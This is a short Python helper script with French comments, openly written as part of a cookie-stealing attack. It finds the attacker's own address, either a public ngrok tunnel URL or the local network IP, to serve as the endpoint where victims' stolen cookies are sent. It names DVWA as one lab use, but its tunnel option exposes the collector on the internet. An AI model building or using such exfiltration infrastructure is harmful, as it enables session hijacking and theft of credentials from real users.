#!/usr/bin/env python3
"""
🌐 IP ATTAQUANT RÉELLE — PAS DE 127.0.0.1
Les cookies volés reviennent VERS TA MACHINE (IP locale ou publique)
"""

import socket
import requests

def get_local_ip():
    """Récupère l'IP RÉELLE de l'attaquant sur le réseau local (ex: 192.168.1.10)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())

def get_public_ip():
    """Récupère l'IP publique INTERNET de l'attaquant"""
    try:
        return requests.get('https://api.ipify.org', timeout=3).text.strip()
    except:
        return None

def detect_attacker_endpoint(port=8888):
    """
    🔑 RETOURNE L'URL OÙ LES VICTIMES ENVOIENT LES DONNÉES VOLÉES
    → IP RÉELLE de l'attaquant (ex: http://192.168.1.10:8888)
    → PAS 127.0.0.1 → les cookies reviennent VERS TOI
    """
    # Méthode 1 : Ngrok (internet)
    try:
        tunnels = requests.get('http://localhost:4040/api/tunnels', timeout=2).json()
        if tunnels.get('tunnels'):
            return tunnels['tunnels'][0]['public_url']
    except:
        pass
    
    # Méthode 2 : IP locale (réseau local - DVWA/lab)
    local_ip = get_local_ip()
    return f"http://{local_ip}:{port}"  # ← IP RÉELLE, pas 127.0.0.1